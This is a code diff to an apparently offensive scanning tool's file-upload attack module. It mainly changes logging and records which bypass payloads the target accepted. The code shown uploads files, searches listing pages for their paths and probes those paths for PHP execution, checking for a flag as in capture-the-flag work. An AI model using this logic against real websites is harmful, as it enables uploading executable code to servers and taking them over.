@@ -114,14 +114,12 @@ class UploadAttack(BaseAttack):
             except Exception:
                 continue
             if not resp or resp.status_code != 200:
-                console.print(f"  [dim][Upload] listing {lurl} → {resp.status_code if resp else 'err'}[/dim]")
                 continue
             all_srcs = [
                 m.group(1) for m in _SRC_RE.finditer(resp.text or "")
                 if not m.group(1).startswith(("data:", "#", "javascript:"))
                 and not any(m.group(1).lower().endswith(e) for e in _skip_ext)
             ]
-            console.print(f"  [dim][Upload] listing {lurl} → 200 | srcs={all_srcs[:10]}[/dim]")
             for p in all_srcs:
                 # Match only the directory portion — not the filename.
                 # e.g. "add_product.php" has no dir → skip; "/uploads/img.jpg" → dir="/uploads" → match.
@@ -133,7 +131,7 @@ class UploadAttack(BaseAttack):
                     found.append(p)
         return list(dict.fromkeys(found))
 
-    async def _check_exec(self, file_url: str, debug: bool = False) -> tuple[bool, list[dict]]:
+    async def _check_exec(self, file_url: str) -> tuple[bool, list[dict]]:
         try:
             resp = await self.session.get(file_url, timeout=10.0)
         except SessionExpiredError:
@@ -142,8 +140,6 @@ class UploadAttack(BaseAttack):
             return False, []
 
         body = resp.text or ""
-        if debug and resp.status_code in (200, 403):
-            console.print(f"  [dim][Upload] probe {resp.status_code} → {file_url}[/dim]")
         if _MARKER not in body:
             return False, []
         # PHP executed: marker appears in output. PHP not executed: file is served
@@ -190,6 +186,7 @@ class UploadAttack(BaseAttack):
         ]
 
         any_upload_ok = False
+        successful_payloads: list[str] = []
         for fname, ct, content in local_payloads:
             if self._should_stop():
                 return []
@@ -231,12 +228,13 @@ class UploadAttack(BaseAttack):
             upload_ok = "success" in body.lower()
             if upload_ok:
                 any_upload_ok = True
+                successful_payloads.append(f"{fname} ({ct})")
             response_paths = self._find_paths_in_response(body, fname)
-            console.print(
-                f"  [dim][Upload] {fname} → HTTP {resp.status_code}"
-                f" | ok={upload_ok} | response_paths={response_paths}"
-                f" | body_snippet={body[:200]!r}[/dim]"
-            )
+            if upload_ok or response_paths:
+                console.print(
+                    f"  [dim][Upload] {fname} → ok={upload_ok} | response_paths={response_paths}"
+                    f" | body_snippet={body[:200]!r}[/dim]"
+                )
             candidates: list[str] = []
             for p in response_paths:
                 candidates.append(urljoin(base, p))
@@ -278,7 +276,7 @@ class UploadAttack(BaseAttack):
             for file_url in candidates[:40]:
                 if self._should_stop():
                     return []
-                rce, findings = await self._check_exec(file_url, debug=upload_ok)
+                rce, findings = await self._check_exec(file_url)
                 if rce:
                     if has_definite_flag(findings):
                         self.stop_event.set()
@@ -286,12 +284,17 @@ class UploadAttack(BaseAttack):
 
         if any_upload_ok:
             console.print(
-                "  [yellow][Upload][/yellow] Bypass çalışıyor ama URL otomatik tespit edilemedi. "
-                "Admin listing sayfasında yüklenen dosyanın URL'ini manuel kontrol edin."
+                "  [yellow][Upload][/yellow] Bypass çalışıyor ama URL otomatik tespit edilemedi.\n"
+                f"  [dim]  Geçen payload'lar: {successful_payloads}\n"
+                "  Admin listing sayfasında yüklenen dosyanın URL'ini manuel kontrol edin.[/dim]"
             )
             return [{
                 "type": "upload_bypass_no_rce",
-                "value": f"File upload bypass confirmed @ {url} — PHP path not auto-detected; check admin panel",
+                "value": (
+                    f"File upload bypass confirmed @ {url} — "
+                    f"working payloads: {', '.join(successful_payloads)}; "
+                    "PHP path not auto-detected; check admin panel"
+                ),
                 "confidence": 0.55,
             }]
         return []
